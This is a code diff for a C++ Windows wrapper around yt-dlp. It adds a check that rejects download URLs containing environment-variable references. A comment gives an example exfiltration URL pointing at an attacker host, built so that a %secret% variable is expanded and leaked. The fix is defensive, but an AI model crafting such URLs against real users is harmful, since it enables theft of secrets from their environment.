@@ -3,7 +3,7 @@
 //TODO: make sure everything is x86
 //TODO: check licence of programs for redistribution
 //TODO: vc++ 2015 is needed for yt-dlp(x86)
-//TODO: change main to int _tmain(int argc, TCHAR *argv[])
+//TODO: change main to int _tmain(int argc, TCHAR *argv[]) in flashgot too
 
 #include "stdafx.h"
 #include <iostream>
@@ -22,7 +22,7 @@ using namespace std;
 using namespace ggicci;
 
 
-int main(int argc, char *argv[])
+int wmain(int argc, WCHAR *argv[], WCHAR *envp[])
 {
 	//initializations
 	try{
@@ -344,6 +344,20 @@ string ytdl(const string &url, vector<string> args, void (*onOutput)(string outp
 {
 	try
 	{
+		//ok so the issue is an attacker could make the user request a malicious URL and steal environment variables from them
+		//for example if the users tries to download https://attacker.com/script.php?secret=%secret% then upon 
+		//receiving this command line argument youtubedl will replace %secret% with the corresponding env. variable value
+		//and send it to the attacker
+		//not really a huge deal because nobody should put secrets in environment variables anyway and also
+		//we are url-encoding our URLs so it would be difficult to come up with a URL that would leak an actual env. var
+		//but not impossible
+		//this could also happen by accident leading to undefined behavior
+		//so we search the URL and if we find any env. variables in it we just reject it
+		if(utils::strHasEnvars(url))
+		{
+			throw dlg_exception("This URL is not supported");
+		}
+
 		args.push_back(url);
 		string ytdlOutput = utils::launchExe("ytdl.exe", args, true, onOutput);
 		return ytdlOutput;
@@ -354,6 +368,7 @@ string ytdl(const string &url, vector<string> args, void (*onOutput)(string outp
 			PLOG_ERROR << e.what();
 		}catch(...){}
 	}
+
 }
 
 void handleDlProgress(string output)
